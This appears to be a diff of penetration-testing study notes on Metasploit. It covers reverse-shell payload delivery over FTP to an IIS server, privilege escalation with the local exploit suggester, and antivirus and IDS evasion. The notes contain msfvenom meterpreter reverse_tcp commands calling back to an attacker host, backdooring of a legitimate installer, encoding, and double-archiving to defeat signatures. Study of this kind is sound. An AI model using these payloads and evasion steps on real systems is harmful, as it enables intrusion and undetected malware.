-# in ftp: put reverse_shell.aspx
+nmap -sV -T4 -p- <TARGET_IP>
 ```
 
-Catch it — multi/handler must mirror the payload settings:
+```bash
+ftp <TARGET_IP>
+```
+
+Login as `anonymous` with any password if allowed.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx > <OUTPUT_FILE>.aspx
+```
+
+```text
+put <OUTPUT_FILE>.aspx
+```
 
 ```text
 use multi/handler
 set LHOST <ATTACKER_IP>
-set LPORT 1337
+set LPORT <PORT>
 run
 ```
 
-Browse to `http://<TARGET_IP>/reverse_shell.aspx` (blank page = payload still fired) → session as `IIS APPPOOL\Web`. If Meterpreter sessions keep dying, encoding the payload can improve runtime stability.
+Start the listener before triggering the payload via its URL.
+
+### Executing the Payload
+
+A triggered `.aspx`/web payload shows a blank page; the payload still runs in the background.
 
 ### Local Exploit Suggester
 
-Low-priv shell + x86 architecture → run it:
-
-```text
-use post/multi/recon/local_exploit_suggester
-set SESSION 2
-run
-```
-
-Work the list top-down: `bypassuac_eventvwr` failed (IIS user isn't in the administrators group — expected), `ms10_015_kitrap0d` delivered SYSTEM. Local exploits also take `SESSION`; use a fresh LPORT (e.g. 1338) for the new handler. Not all suggester results are accurate — expect to try a few.
+Same `local_exploit_suggester` workflow as under Meterpreter: background the session, search and `use` the module, `set SESSION`, run, then `use` a suggested local exploit with `SESSION`/`LHOST`/`LPORT` set.
 
 ## Firewall and IDS/IPS Evasion
 
-Defender landscape: **endpoint protection** (per-host AV/antimalware/firewall/anti-DDoS bundles) and **perimeter protection** (edge devices), with the DMZ between them housing public-facing servers.
+Covers endpoint/perimeter defenses, detection methods, and techniques to reduce payload detection.
 
-Security policies = allow/deny lists (ACL-style) targeting traffic, applications, user access, files, DDoS. Matching engines:
+### Endpoint Protection
 
-- **Signature-based** — packet comparison against known attack signatures; 100% match → alarm. Most host AV still leans on this.
-- **Heuristic/statistical anomaly** — deviation from a learned baseline (incl. APT modus-operandi signatures).
-- **Stateful protocol analysis** — divergence from pre-built profiles of benign protocol behavior.
-- **SOC live monitoring** — analysts on a live feed.
+Host-based protection: antivirus, antimalware, firewall, anti-DDoS (e.g. Avast, Nod32, Malwarebytes, BitDefender).
 
-MSF6 tunnels AES-encrypted Meterpreter comms — mostly handles network IDS/IPS. Sender-IP-flagging rulesets are beaten by riding allowed services (Equifax 2017: Struts foothold + months of unnoticed DNS exfiltration). Remaining problem is the payload file on disk pre-execution, where signature matching kills it — default MSF payloads are all in AV databases by now.
+### Perimeter Protection
 
-Backdoored executables — inject shellcode into a legitimate binary:
+Edge devices controlling access between public and private networks, often via a DMZ (lower security than internal, higher trust than the internet).
+
+### Security Policies
+
+Allow/deny rules applied to network traffic, applications, user access, file management, and DDoS protection.
+
+`Signature-based` match against known attack patterns | `Heuristic/Statistical Anomaly` behavioral deviation from a baseline | `Stateful Protocol Analysis` deviation from accepted protocol profiles | `Live-monitoring/SOC` analyst-reviewed live feeds
+
+### Evasion Techniques
+
+MSF6 tunnels AES-encrypted Meterpreter traffic, mitigating signature-based network IDS/IPS. Executable payloads can still be fingerprinted on disk before execution.
 
 ```bash
-msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -k -x <TEMPLATE_FILE>.exe -e x86/shikata_ga_nai -a x86 --platform windows -o <OUTPUT_FILE>.exe -i 5
 ```
 
-`-x` = template, `-k` = keep the original app running normally while the payload runs in a separate thread (only giveaway: a console-launched copy pops a payload window).
+`-x` inject payload into an existing executable template (backdooring) | `-k` keep the template's original execution running in a separate thread
 
-Archives — password-protected double-RAR defeats most signatures:
+A `-k` backdoored exe launched from a CLI still pops a visible payload window.
+
+### Archives
+
+Password-protected archives bypass many AV signatures (flagged separately as "unable to scan"). Double-archiving and stripping the extension reduces detection further.
 
 ```bash
-msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5    # 11/59 on VT
-msf-virustotal -k <API key> -f test.js
+rar a <OUTPUT_FILE>.rar -p <FILE>
+mv <OUTPUT_FILE>.rar <OUTPUT_FILE>
+rar a <OUTPUT_FILE_2>.rar -p <OUTPUT_FILE>
+mv <OUTPUT_FILE_2>.rar <OUTPUT_FILE_2>
+```
 
+```bash
 wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
 tar -xzvf rarlinux-x64-612.tar.gz && cd rar
-rar a ~/test.rar -p ~/test.js && mv test.rar test        # password, strip .rar
-rar a test2.rar -p test && mv test2.rar test2            # second layer
-msf-virustotal -k <API key> -f test2                     # 0/49
 ```
 
-Caveats: locked archives surface on the AV dashboard as unscannable, and uploading anything to VT licenses worldwide redistribution — think before submitting engagement payloads.
+### Packers
 
-Packers (UPX, Enigma Protector, MPRESS, Alternate EXE Packer, ExeStealth, Morphine, MEW, Themida) compress payload+decompressor into one file, transparently restoring the original at run.
+Executable compression combining payload and decompression code into one file as another evasion layer.
 
-Exploit coding: randomize buffer patterns (Offset switches in the module's Targets) and avoid obvious NOP sleds — both are IPS-signature staples. Sandbox-test custom exploits first; you may get one shot on the assessment.
+Popular packers: UPX, The Enigma Protector, MPRESS, Alternate EXE Packer, ExeStealth, Morphine, MEW, Themida.
+
+### Exploit Coding
+
+Randomizing buffer offsets and avoiding obvious NOP sleds helps evade IDS/IPS signature matching on exploit code.
+
+```ruby
+'Targets' =>
+[
+    [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
+],
+```
+
+## MSF6 Updates
+
+August 2020 changes: AES encryption for all Meterpreter implementations (Windows, Python, Java, Mettle, PHP), SMBv3 client support, polymorphic payload generation.
+
+Upgrading to MSF6 breaks existing MSF5 payload sessions; MSF5-generated payloads are incompatible with MSF6 communication. `load mimikatz` now loads Kiwi (Mimikatz extension replaced).
+
+Changelog: https://www.rapid7.com/blog/post/2020/08/06/metasploit-6-now-under-active-development/
